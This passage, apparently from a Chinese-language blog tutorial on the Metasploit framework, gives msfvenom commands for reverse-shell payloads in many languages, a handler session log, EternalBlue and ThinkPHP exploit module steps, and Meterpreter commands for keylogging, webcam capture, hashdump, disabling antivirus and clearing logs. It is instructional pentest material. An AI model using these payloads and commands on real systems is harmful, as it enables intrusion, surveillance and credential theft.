LHOST=192.168.2.2 LPORT=4444 -</span><br><span class="line">f aspx -o shell.aspx</span><br><span class="line"></span><br><span class="line">jsp：</span><br><span class="line">Msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.2 </span><br><span class="line">LPORT=4444 -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">war：</span><br><span class="line">msfvenom-p java/jsp_shell_reverse_tcp LHOST=192.168.2.2 </span><br><span class="line">LPORT=4444 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>
+
+<p>实例：<br>生成payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.40.132</span><br><span class="line">lport=5555 -f raw -o shell_.php</span><br></pre></td></tr></table></figure>
+
+<p>创建监听器：</p>
+<blockquote>
+<p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.40.132<br>msf6 exploit(multi&#x2F;handler) &gt; set lport 5555<br>msf6 exploit(multi&#x2F;handler) &gt; run<br>[*] Started reverse TCP handler on 192.168.40.132:5555<br>[*] Meterpreter session 3 opened (192.168.40.132:5555 -&gt; 192.168.40.142:49419) at 10:54:02 -0400<br>meterpreter &gt; sysinfo<br>Computer : SOURCE-PC<br>OS : Windows NT SOURCE-PC 6.1 build 7600 Meterpreter :<br>php&#x2F;windows</p>
+</blockquote>
+<ul>
+<li>msfvenom 生成 payload (脚本 payload )</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python：</span><br><span class="line">msfvenom-p python/meterpreter/reverse_tcp LHOST=192.168.2.2 </span><br><span class="line">LPORT=4444 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">PowerShell:</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http </span><br><span class="line">LHOST=192.168.2.2 LPORT=4444 -f psh &gt; shell.ps1</span><br><span class="line"></span><br><span class="line">bash：</span><br><span class="line">msfvenom-p cmd/unix/reverse_bash LHOST=192.168.2.2 LPORT=4444 </span><br><span class="line">-f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">perl：</span><br><span class="line">msfvenom-p cmd/unix/reverse_perl LHOST=192.168.2.2 LPORT=4444 </span><br><span class="line">-f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_http</span><br><span class="line">LHOST=192.168.2.2 LPORT=4444 -f psh &gt; shell.ps1</span><br><span class="line"></span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -File shell.ps1</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSF漏洞利用模块-exploits"><a href="#MSF漏洞利用模块-exploits" class="headerlink" title="MSF漏洞利用模块 - exploits"></a>MSF漏洞利用模块 - exploits</h1><ul>
+<li>模块路径</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits</span><br></pre></td></tr></table></figure>
+
+<h2 id="Windows-MS17-010"><a href="#Windows-MS17-010" class="headerlink" title="Windows - MS17-010"></a>Windows - MS17-010</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305232257415.png" alt="image-20230523225730301"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set rhosts 192.168.3.23</span><br><span class="line">check //检测目标是否存在漏洞</span><br><span class="line">run //运行攻击模块</span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux-Thinkphp-RCE"><a href="#Linux-Thinkphp-RCE" class="headerlink" title="Linux - Thinkphp-RCE"></a>Linux - Thinkphp-RCE</h2><blockquote>
+<p>search thinkphp</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202305232259381.png" alt="image-20230523225904305"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/thinkphp_rce</span><br><span class="line">set rhosts xx.xx.xx.xx</span><br><span class="line">set rport xxxx</span><br><span class="line">set srvport xxxxxx</span><br><span class="line">set lhost xx.xx.xx.xx</span><br><span class="line">set lport xxxx</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Meterpreter扩展模块"><a href="#Meterpreter扩展模块" class="headerlink" title="Meterpreter扩展模块"></a>Meterpreter扩展模块</h1><h2 id="meterpreter简介"><a href="#meterpreter简介" class="headerlink" title="meterpreter简介"></a>meterpreter简介</h2><p>Meterpreter 是一个高级、动态、可扩展的 payload ，简单理解是一个高级的CMD ，里面封装了 Metasploit 的功能</p>
+<p>Meterpreter 是 Metasploit 框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻载荷能够获得目标系统的一个 Meterpreter shell 的链接。</p>
+<p>Meterpreter shell 作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。</p>
+<h2 id="meterpreter-特点"><a href="#meterpreter-特点" class="headerlink" title="meterpreter 特点"></a>meterpreter 特点</h2><p>Metasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux ，同时支持 x86、x64 平台，另外， Meterpreter 还提供了基于 PHP 和 Java 语言的实现。 Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。</p>
+<h3 id="进入meterpreter"><a href="#进入meterpreter" class="headerlink" title="进入meterpreter"></a>进入meterpreter</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background：将当前session挂起</span><br><span class="line">sessions -l：列出当前所有的session</span><br><span class="line">sessions -i id：进入某个session</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>常用命令</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">background #放回后台</span><br><span class="line">exit #关闭会话</span><br><span class="line">help #帮助信息</span><br><span class="line">sysinfo #系统平台信息</span><br><span class="line">screenshot #屏幕截取</span><br><span class="line">shell #命令行shell (exit退出)  </span><br><span class="line">getlwd #查看本地目录</span><br><span class="line">lcd #切换本地目录</span><br><span class="line">getwd #查看目录</span><br><span class="line">ls #查看文件目录列表</span><br><span class="line">cd #切换目录</span><br><span class="line">rm #删除文件</span><br><span class="line">download C:\\1.txt 1.txt #下载文件</span><br><span class="line">upload /var/www/wce.exe wce.exe #上传 文件</span><br><span class="line">search -d c: -f *.doc #搜索文件</span><br><span class="line">execute -f cmd.exe -i #执行程序/命令</span><br><span class="line">ps #查看进程</span><br><span class="line">getuid #查看当前用户权限</span><br><span class="line">run killav #关闭杀毒软件</span><br><span class="line">run getgui-e #启用远程桌面</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="meterpreter常用shell"><a href="#meterpreter常用shell" class="headerlink" title="meterpreter常用shell"></a>meterpreter常用shell</h2><h3 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h3><blockquote>
+<p>基于TCP的反弹shel</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/meterpreter/reverse_tcp</span><br><span class="line">windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h3><blockquote>
+<p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到攻击者的机器，所以在内网中经常会使用，不需要设置LHOST</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux/x86/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h3><blockquote>
+<p>基于http方式的反向连接，在网速慢的情况下不稳定</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure>
+
+<h3 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h3><blockquote>
+<p>基于https方式的反向连接，在网速慢的情况下不稳定</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/meterpreter/reverse_https</span><br></pre></td></tr></table></figure>
+
+<h2 id="meterpreter命令详解"><a href="#meterpreter命令详解" class="headerlink" title="meterpreter命令详解"></a>meterpreter命令详解</h2><h3 id="核心命令-1"><a href="#核心命令-1" class="headerlink" title="核心命令"></a>核心命令</h3><blockquote>
+<ol>
+<li>?           – 帮助菜单</li>
+<li>background – 将当前会话移动到后台</li>
+<li>bg         - background的别名</li>
+<li>bgkill     – 总之后台 meterpreter 脚本</li>
+<li>bglist     – 列出后台运行中的脚本</li>
+<li>bgrun       – 作为一个后台线程运行脚本</li>
+<li>channel     – 显示活动频道</li>
+<li>close       – 关闭通道</li>
+<li>disable_unicode_encoding   - 禁用unicode字符串的编码</li>
+<li>enable_unicode_encoding     - 启用unicode字符串的编码</li>
+<li>exit       – 终止 meterpreter 会话</li>
+<li>help       – 帮助菜单</li>
+<li>info       - 显示有关Post模块的信息</li>
+<li>irb         - 在当前会话上打开交互式 Ruby 外壳</li>
+<li>load       - 加载一个或多个meterpreter扩展</li>
+<li>machine_id - 获取连接到会话的计算机的 MSF ID</li>
+<li>migrate     - 将服务迁移到另一个进程</li>
+<li>pivot       - 管理pivot侦听器</li>
+<li>pry         - 打开当前会话上的pry调试器</li>
+<li>quit       - 终止 meterpreter 会话</li>
+<li>read       - 从通道中读取数据</li>
+<li>resource   - 运行存储在文件中的命令</li>
+<li>run         - 执行一个meterpreter 脚本 或者 Post模块</li>
+<li>secure     - 在会话中协商TLV分组加密</li>
+<li>sessions   - 快速切换到另外一个session</li>
+<li>set_timeouts - 设置当前会话的超时值</li>
+<li>sleep       - 强制meterpreter停止活动，然后重新建立会话</li>
+<li>transport   - 改变目前的运输机制.</li>
+<li>use         - 加载 meterpreter 的扩展，’load’的旧别名</li>
+<li>uuid       - 获取当前会话的UUID</li>
+<li>write       – 将数据写入到一个通道</li>
+</ol>
+</blockquote>
+<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><blockquote>
+<ol>
+<li>cat         - 读取并输出到标准输出文件的内容</li>
+<li>cd         - 更改目录对受害人</li>
+<li>checksum   - 检索文件的校验和</li>
+<li>cp         - 将源复制到目标</li>
+<li>dir         - 列出文件（别名为 ls）</li>
+<li>download   - 下载文件或目录</li>
+<li>edit       - 编辑文件</li>
+<li>getlwd     - 输出本地工作目录</li>
+<li>getwd       - 输出工作目录</li>
+<li>lcd         - 更改本地工作目录</li>
+<li>lls         - 列出本地文件</li>
+<li>lpwd       - 输出本地工作目录</li>
+<li>ls         - 列出当前目录中的文件列表</li>
+<li>mkdir       - 创建目录</li>
+<li>mv         - 将源移动到目标</li>
+<li>rm         - 删除指定的文件</li>
+<li>rmdir       - 删除目录</li>
+<li>search     - 在目标主机文件系统上查找搜索文件 例如：search -d c:\ </li>
+<li>-f *.doc 在目标主机C盘下搜索doc文档</li>
+<li>show_mount - 列出所有装载点&#x2F;逻辑驱动器</li>
+<li>upload     - 上传文件或目录</li>
+</ol>
+</blockquote>
+<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><blockquote>
+<ol>
+<li><p>arp         - 显示主机ARP缓存</p>
+</li>
+<li><p>getproxy   - 显示当前代理配置</p>
+</li>
+<li><p>ifconfig   - 显示网络接口的关键信息</p>
+</li>
+<li><p>ipconfig   - 显示网络接口的关键信息</p>
+</li>
+<li><p>netstat     - 显示网络连接</p>
+</li>
+<li><p>portfwd     - 将本地端口转发到远程服务</p>
+</li>
+<li><p>例如：portfwd add -l 1122 -p 3389 -r </p>
+</li>
+<li><p>192.168.250.176把目标主机192.168.250.176的3389端口转发到1122端口</p>
+</li>
+<li><p>resolve     - 解析目标上的一组主机名</p>
+</li>
+<li><p>route       - 查看或加入受害者路由表 route add 5.5.5.0 </p>
+</li>
+<li><p>255.255.255.0 1 用sessions 1会话加入指定网段</p>
+</li>
+</ol>
+</blockquote>
+<h3 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h3><blockquote>
+<p>clearev     - 清除事件日志<br>drop_token - 放弃任何活动模拟令牌。<br>execute     - 执行命令，在目标主机上运行某个程序 execute -f<br>notepad.exe ，执行目标主机上的记事本程序，隐藏后台执行，加参数-H<br>getenv     - 获取一个或多个环境变量值<br>getpid     - 获取当前进程 ID (PID)<br>getprivs   - 尝试启用当前进程可用的所有权限<br>getsid     - 获取当前运行服务用户的SID<br>getuid     - 获取当前运行服务的用户<br>kill       - 终止进程<br>localtime   - 显示目标系统的本地日期和时间<br>pgrep       - 按名称显示进程<br>pkill       - 按名称终止进程<br>ps         - 列出正在运行的进程<br>reboot     - 重新启动受害人的计算机<br>reg         - 与受害人的注册表进行交互<br>rev2self   - 在受害者机器上调用 RevertToSelf()<br>shell       - 在远程计算机上打开一个shell<br>shutdown   - 关闭远程计算机<br>steal_token - 试图窃取指定的 (PID) 进程的令牌<br>suspend     - 挂起或恢复进程列表<br>sysinfo     - 获取关于远程系统的信息，如操作系统</p>
+</blockquote>
+<h3 id="用户界面命令"><a href="#用户界面命令" class="headerlink" title="用户界面命令"></a>用户界面命令</h3><blockquote>
+<p>enumdesktops   - 列出所有可访问的desktops和Windows<br>getdesktop     - 获取当前的 meterpreter 桌面<br>idletime       - 检查长时间以来，受害者系统空闲进程<br>keyboard_send   - 发送一个键盘记录器<br>keyevent       - 发送key事件<br>keyscan_dump   - 转储键盘记录器缓冲区内容<br>keyscan_start   - 启动键盘记录器<br>keyscan_stop   - 停止键盘记录器<br>mouse           - 发送鼠标事件<br>screenshare     - 实时监视远程用户的桌面<br>screenshot     - 抓取交互式桌面的屏幕截图<br>setdesktop     - 更改 meterpreter 当前桌面<br>uictl           - 启用用户界面组件的一些控件</p>
+</blockquote>
+<h3 id="摄像头命令"><a href="#摄像头命令" class="headerlink" title="摄像头命令"></a>摄像头命令</h3><blockquote>
+<p>record_mic     - 从默认麦克风记录音频X秒<br>webcam_chat     - 启动视频聊天<br>webcam_list     - 列出摄像头<br>webcam_snap     - 从指定的网络摄像头获取snapshot<br>webcam_stream   - 从指定的网络摄像头播放视频流</p>
+</blockquote>
+<h3 id="音频输出命令"><a href="#音频输出命令" class="headerlink" title="音频输出命令"></a>音频输出命令</h3><blockquote>
+<p>play   - 在目标系统上播放波形音频文件(.wav)</p>
+</blockquote>
+<h3 id="提权命令"><a href="#提权命令" class="headerlink" title="提权命令"></a>提权命令</h3><blockquote>
+<p>getsystem   - 获得系统管理员权限</p>
+</blockquote>
+<h3 id="密码转储命令"><a href="#密码转储命令" class="headerlink" title="密码转储命令"></a>密码转储命令</h3><blockquote>
+<ol>
+<li>hashdump   - 抓取哈希密码 (SAM) 文件中的值</li>
+<li>hashdump 可以跳过杀毒软件，但现在有两个脚本，都更加隐蔽，”run hashdump”和”run smart_hashdump”。</li>
+</ol>
+</blockquote>
+<h3 id="Timestomp"><a href="#Timestomp" class="headerlink" title="Timestomp"></a>Timestomp</h3><blockquote>
+<ol>
+<li>timestomp   - 操作修改文件的MACE属性</li>
+<li>Modified：修改时间</li>
+<li>Accessed：访问时间</li>
+<li>Created：创建时间</li>
+<li>Entry Modified： 条目修改时间</li>
+</ol>
+</blockquote>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">hihopkc</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://hihopkc.github.io/posts/62582.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://hihopkc.github.io/posts/62582.html')">Metasploit渗透框架</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://hihopkc.github.io/posts/62582.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Metasploit渗透框架&amp;url=https://hihopkc.github.io/posts/62582.html&amp;pic=/img/default_cover.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hihopkc.github.io" target="_blank">嘻哈磕碜のBlogs</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/MSF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>MSF<span class="tagsPageCount">1</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="/img/default_cover.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/12923.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">应急响应</div></div></a></div><div class="next-post pull-right"><a href="/posts/34533.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308271124845.svg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">初始化MSF数据库错误</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div><div class="comment-tips" id="comment-tips"><span>✅ 你无需删除空行，直接评论以获取最佳展示效果</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" ait="status"/></div></div><div class="author-info__description">站在巨人的肩上</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">hihopkc</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hihopkc" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/56853573" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客鸭~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">1.</span> <span class="toc-text">常见名词解释</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E7%AE%80%E4%BB%8B"><span class="toc-number">2.</span> <span class="toc-text">MSF简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">MSF框架结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.</span> <span class="toc-text">MSF配置数据库</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.</span> <span class="toc-text">MSF命令查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">5.1.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4"><span class="toc-number">5.2.</span> <span class="toc-text">数据库管理命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4"><span class="toc-number">5.3.</span> <span class="toc-text">核心命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4"><span class="toc-number">5.4.</span> <span class="toc-text">模块命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%9C%E4%B8%9A%E5%91%BD%E4%BB%A4"><span class="toc-number">5.5.</span> <span class="toc-text">作业命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">5.6.</span> <span class="toc-text">资源脚本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4"><span class="toc-number">5.7.</span> <span class="toc-text">后端数据库命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%AB%AF%E5%87%AD%E8%AF%81%E5%91%BD%E4%BB%A4"><span class="toc-number">5.8.</span> <span class="toc-text">后端凭证命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%8F%91%E8%80%85%E5%91%BD%E4%BB%A4"><span class="toc-number">5.9.</span> <span class="toc-text">开发者命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7%E5%91%BD%E4%BB%A4"><span class="toc-number">5.10.</span> <span class="toc-text">攻击载荷命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D"><span class="toc-number">6.</span> <span class="toc-text">MSF模块介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E8%BE%85%E5%8A%A9%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97-auxiliary"><span class="toc-number">7.</span> <span class="toc-text">MSF辅助扫描模块 - auxiliary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">7.1.</span> <span class="toc-text">MSF主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-number">7.2.</span> <span class="toc-text">MSF服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-number">7.3.</span> <span class="toc-text">Telnet服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-number">7.4.</span> <span class="toc-text">SSH服务扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%AB%E6%8F%8F"><span class="toc-number">7.5.</span> <span class="toc-text">Oracle数据库扫描</span></a></li><li class="toc-item 